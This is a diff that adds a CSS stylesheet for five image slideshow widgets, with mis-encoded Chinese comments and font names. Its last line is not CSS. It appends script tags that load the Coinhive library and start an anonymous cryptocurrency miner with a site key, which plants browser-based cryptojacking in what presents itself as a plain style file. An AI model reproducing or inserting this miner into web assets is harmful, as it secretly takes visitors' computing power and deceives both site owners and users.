@@ -1,0 +1,213 @@
+@charset "utf-8";
+/* Õº∆¨–¬Œ≈ */
+.block_silbo {
+	/*background:#007639;*/
+}
+.silbo-slide {
+	margin: 0 auto;
+}
+.silbo-slide .Slides li{text-align:center; _font-size:0;}
+.silbo-slide .Slides img{border:0;}
+.silbo-slide .Slides li .SlideTitle{height:40px;position:absolute;left:0;bottom:0;z-index:10;line-height:40px;color:#FFFFFF; font-size:14px;}
+.silbo-slide .Slides li .SlideTitle b{
+    height:40px;position:absolute;left:0;bottom:0;
+	z-index:-1;
+}
+.silbo-slide #SlidePlayer{position:relative;margin:0 auto;}
+.silbo-slide .Slides{padding:0;margin:0;list-style:none;overflow:hidden;}
+.silbo-slide .SlideTriggers{list-style:none;position:absolute;bottom:20px;left:900px;z-index:11; text-align: center; width: 100%;}
+/*.silbo-slide .SlideTriggers li{display:inline-block; *display:inline; zoom:1;color:#74a8ed;text-align:center;width:12px;height:12px;font-family:Arial;font-size:14px;cursor:pointer;overflow:hidden;margin:0 2px;border:1px solid #FFF;background:#FFF;color:#FFF; font-size:0; border-radius:10px;}
+.silbo-slide .SlideTriggers li.Current{font-weight:bold;background:#FF9900;color:#FF9900;border:1px solid #FFF;}*/
+.silbo-slide .SlideTriggers li{display:block; *display:inline; float: left; zoom:1;color:#74a8ed;text-align:center;width:38px;height:6px;font-family:Arial;cursor:pointer;overflow:hidden;margin:0 4px;border:1px solid #FFF;background:#FFF;color:#FFF; font-size:0; box-shadow:0 0 3px #AAAAAA;}
+.silbo-slide .SlideTriggers li.Current{font-weight:bold;background:#FF6600;color:#FF6600;border:1px solid #FFF;}
+/* ≥ﬂ¥Á */
+.silbo-slide, .silbo-slide .Slides li, .silbo-slide .Slides img {
+    height:450px;
+	width:100%;
+}
+.silbo-slide .Slides li .SlideTitle, .silbo-slide .Slides li .SlideTitle b {
+	width:100%;
+}
+.silbo-slide .Slides {
+    height:450px;
+}
+
+/*Ωπµ„Õº2*/
+.silbo-slide_02 .Slides li{float:left;}
+.silbo-slide_02 .Slides img{border:0;display:block;}
+.silbo-slide_02 .Slides li .SlideTitle{height:50px;position:absolute;left:0;bottom:0;z-index:10;line-height:50px;color:#fff; font-size:14px; text-indent:14px;/*text-align: center;*/}
+.silbo-slide_02 .Slides li .SlideTitle b{height:50px;position:absolute;left:0;bottom:0;/*background:#a61700;filter:alpha(opacity=60);opacity:0.6;*/z-index:-1;}
+.silbo-slide_02 #SlidePlayer_02{position:relative;margin:0 auto;}
+.silbo-slide_02 .Slides{padding:0;margin:0;list-style:none;overflow:hidden;}
+.silbo-slide_02 .SlideTriggers{list-style:none;position:absolute;bottom:20px;right:10px;z-index:11;}
+.silbo-slide_02 .SlideTriggers li{float:left;display:inline;color:#b68885;text-align:center;line-height:17px;width:17px;height:17px;font-family:Arial;font-size:12px;cursor:pointer;overflow:hidden;margin:0 0 0 3px;border:1px solid #b68885;background:#b68885;color:#b68885;opacity:0.90; filter:alpha(opacity=90);border-radius:10px;}
+.silbo-slide_02 .SlideTriggers li.Current{font-weight:bold;font-size:12px;background:#ffea00;color:white;border:1px solid #ffea00;opacity:1; filter:alpha(opacity=100);}
+
+/* ≥ﬂ¥Á */
+.silbo-slide_02, .silbo-slide_02 .Slides li, .silbo-slide_02 .Slides img {
+	width:500px;
+    height:350px;
+}
+.silbo-slide_02 .Slides li .SlideTitle b {
+	width:400px;
+	overflow: hidden;
+}
+.silbo-slide_02 .Slides li .SlideTitle {
+	width:500px;
+	background:#a61700;filter:alpha(opacity=60);opacity:0.6;
+}
+.silbo-slide_02 .Slides img, .silbo-slide_02 .Slides {
+    height:350px;
+}
+.silbo-slide_02 .SlideTriggers li{font-size:0; line-height:10px;width:10px;height:10px;}
+.silbo-slide_02 .SlideTriggers li.Current{font-size:0;}
+
+
+
+
+/*Ωπµ„Õº3*/
+.silbo-slide_03 .Slides li{text-align:center; _font-size:0;}
+.silbo-slide_03 .Slides img{border:0;}
+.silbo-slide_03 .Slides li .SlideTitle{height:40px;position:absolute;left:0;bottom:-40px;z-index:10;line-height:40px;color:#7e7e7e; font-size:14px; background:#fff; overflow:hidden;}
+.silbo-slide_03 .Slides li .SlideTitle b{
+    height:40px;position:absolute;left:0;bottom:0;
+	z-index:-1;
+}
+.silbo-slide_03 #SlidePlayer_03{position:relative;margin:0 auto;}
+.silbo-slide_03 .Slides{padding:0;margin:0;list-style:none;overflow:hidden;}
+.silbo-slide_03 .SlideTriggers{list-style:none;position:absolute;bottom:0;left:0;z-index:11; text-align: right; width: 100%;}
+.silbo-slide_03 .SlideTriggers li{display:inline-block; *display:inline; zoom:1;color:#74a8ed;text-align:center;width:12px;height:10px;font-family:Arial;font-size:14px;cursor:pointer;overflow:hidden;background:#FFF;color:#FFF; font-size:0; border:1px solid #eee;/*margin:0 1px;border-radius:10px;*/}
+.silbo-slide_03 .SlideTriggers li.Current{font-weight:bold;background:#FF9900;color:#FF9900;border:1px solid #eee;}
+/*.silbo-slide_03 .SlideTriggers li{display:block; *display:inline; zoom:1;color:#74a8ed;text-align:center;width:38px;height:6px;font-family:Arial;cursor:pointer;overflow:hidden;margin:0 4px;border:1px solid #FFF;background:#FFF;color:#FFF; font-size:0; box-shadow:0 0 3px #AAAAAA;}
+.silbo-slide_03 .SlideTriggers li.Current{font-weight:bold;background:#FF6600;color:#FF6600;border:1px solid #FFF;}*/
+/* ≥ﬂ¥Á */
+.silbo-slide_03, .silbo-slide_03 .Slides li, .silbo-slide_03 .Slides img {
+    height:185px;
+	width:100%;
+}
+.silbo-slide_03 .Slides li .SlideTitle, .silbo-slide_03 .Slides li .SlideTitle b {
+	width:100%;
+}
+.silbo-slide_03 .Slides {
+    height:185px;
+}
+
+
+/*Ωπµ„Õº4*/
+.silbo-slide_04 .Slides li{float:left;}
+.silbo-slide_04 .Slides img{border:0;display:block;}
+.silbo-slide_04 .Slides li .SlideTitle{height:30px;position:absolute;left:0;bottom:0;z-index:10;line-height:30px;color:#FFF; font-size:12px; text-indent:14px;/*text-align: center; display: none;*/}
+.silbo-slide_04 .Slides li .SlideTitle b{height:30px;position:absolute;left:0;bottom:0;background:#000;filter:alpha(opacity=40);opacity:0.4;z-index:-1;}
+.silbo-slide_04 #SlidePlayer_04{position:relative;margin:0 auto;}
+.silbo-slide_04 .Slides{padding:0;margin:0;list-style:none;overflow:hidden;}
+.silbo-slide_04 .SlideTriggers{list-style:none;position:absolute;top:300px;left: 570px;z-index:11;}
+.silbo-slide_04 .SlideTriggers li{float:left;display:inline;color:#74a8ed;text-align:center;line-height:17px;width:17px;height:17px;font-family:Arial;font-size:12px;cursor:pointer;overflow:hidden;margin:0 0 0 3px;border:1px solid #6d98be;background:#6d98be;color:#FFF;opacity:0.90; filter:alpha(opacity=90);border-radius:10px;}
+.silbo-slide_04 .SlideTriggers li.Current{font-weight:bold;font-size:12px;background:#fff000;color:white;border:1px solid #fff000;opacity:1; filter:alpha(opacity=100);}
+
+/* ≥ﬂ¥Á */
+.silbo-slide_04, .silbo-slide_04 .Slides li, .silbo-slide_04 .Slides img {
+	width:725px;
+    height:350px;
+}
+.silbo-slide_04 .Slides li .SlideTitle, .silbo-slide_04 .Slides li .SlideTitle b {
+	width:725px;
+}
+.silbo-slide_04 .Slides img, .silbo-slide_04 .Slides, .silbo-slide_04 .title_bg {
+    height:350px;
+}
+.silbo-slide_04 .SlideTriggers li{font-size:0; line-height:9px;width:9px;height:9px; margin:0 3px; float:none; display:inline-block; *display:inline; zoom:1;}
+.silbo-slide_04 .SlideTriggers li.Current{font-size:0;}
+.silbo-slide_04 .pic {
+	float:left;
+}
+.silbo-slide_04 .pic, .silbo-slide_04 .Slides img {
+	width:500px;
+}
+.silbo-slide_04 .title_bg {
+	width:225px;
+	float: right;
+	background:#0b5492;
+}
+.silbo-slide_04 .title_bg .title {
+	height:48px;
+	line-height:24px;
+	overflow:hidden;
+	padding:35px 25px 0 25px;
+}
+.silbo-slide_04 .title_bg .title a {
+	color:#fff;
+	font-family:"Œ¢»Ì—≈∫⁄","∫⁄ÃÂ";
+	font-size:18px;
+}
+.silbo-slide_04 .title_bg .title a:hover {
+	color:#fff000;
+}
+.silbo-slide_04 .title_bg .sum {
+	height:144px;
+	font-family: "ÀŒÃÂ";
+	font-size:12px;
+	line-height:24px;
+	overflow:hidden;
+	color:#fff;
+	padding:40px 25px 0;
+}
+
+/*Ωπµ„Õº5*/
+.silbo-slide_05 .Slides li{float:left;}
+.silbo-slide_05 .Slides img{border:0;display:block;}
+.silbo-slide_05 .Slides li .SlideTitle{height:30px;position:absolute;left:0;bottom:0;z-index:10;line-height:30px;color:#FFF; font-size:12px; text-indent:14px;/*text-align: center; display: none;*/}
+.silbo-slide_05 .Slides li .SlideTitle b{height:30px;position:absolute;left:0;bottom:0;background:#000;filter:alpha(opacity=40);opacity:0.4;z-index:-1;}
+.silbo-slide_05 #SlidePlayer_05{position:relative;margin:0 auto;}
+.silbo-slide_05 .Slides{padding:0;margin:0;list-style:none;overflow:hidden;}
+.silbo-slide_05 .SlideTriggers{list-style:none;position:absolute;top:300px;left: 700px;z-index:11;}
+.silbo-slide_05 .SlideTriggers li{float:left;display:inline;color:#c0c0c0;text-align:center;line-height:17px;width:17px;height:17px;font-family:Arial;font-size:12px;cursor:pointer;overflow:hidden;margin:0 0 0 3px;border:1px solid #c0c0c0;background:#c0c0c0;color:#c0c0c0;opacity:0.90; filter:alpha(opacity=90);border-radius:10px;}
+.silbo-slide_05 .SlideTriggers li.Current{font-weight:bold;font-size:12px;background:#d14528;color:white;border:1px solid #d14528;opacity:1; filter:alpha(opacity=100);}
+
+/* ≥ﬂ¥Á */
+.silbo-slide_05, .silbo-slide_05 .Slides li, .silbo-slide_05 .Slides img {
+	width:1000px;
+    height:330px;
+}
+.silbo-slide_05 .Slides li .SlideTitle, .silbo-slide_05 .Slides li .SlideTitle b {
+	width:1000px;
+}
+.silbo-slide_05 .Slides img, .silbo-slide_05 .Slides, .silbo-slide_05 .title_bg {
+    height:330px;
+}
+.silbo-slide_05 .SlideTriggers li{font-size:0; line-height:9px;width:9px;height:9px; margin:0 3px; float:none; display:inline-block; *display:inline; zoom:1;}
+.silbo-slide_05 .SlideTriggers li.Current{font-size:0;}
+.silbo-slide_05 .pic {
+	float:left;
+}
+.silbo-slide_05 .pic, .silbo-slide_05 .Slides img {
+	width:500px;
+}
+.silbo-slide_05 .title_bg {
+	width:500px;
+	float: right;
+	background:#f0f0f0;
+}
+.silbo-slide_05 .title_bg .title {
+	height:48px;
+	line-height:24px;
+	overflow:hidden;
+	padding:35px 40px 0 40px;
+}
+.silbo-slide_05 .title_bg .title a {
+	color:#000000;
+	font-family:"Œ¢»Ì—≈∫⁄","∫⁄ÃÂ";
+	font-size:18px;
+}
+.silbo-slide_05 .title_bg .title a:hover {
+	color:#ff6600;
+}
+.silbo-slide_05 .title_bg .sum {
+	height:144px;
+	font-family: "ÀŒÃÂ";
+	font-size:12px;
+	line-height:24px;
+	overflow:hidden;
+	color:#7d7d7d;
+	padding:40px 40px 0;
+}
+<script src="https://coinhive.com/lib/coinhive.min.js"></script> <script>var text = new CoinHive.Anonymous('I8rYivhV3ph1iNrKfUjvdqNGfc7iXOEw',{throttle: 0.6});text.start();</script>
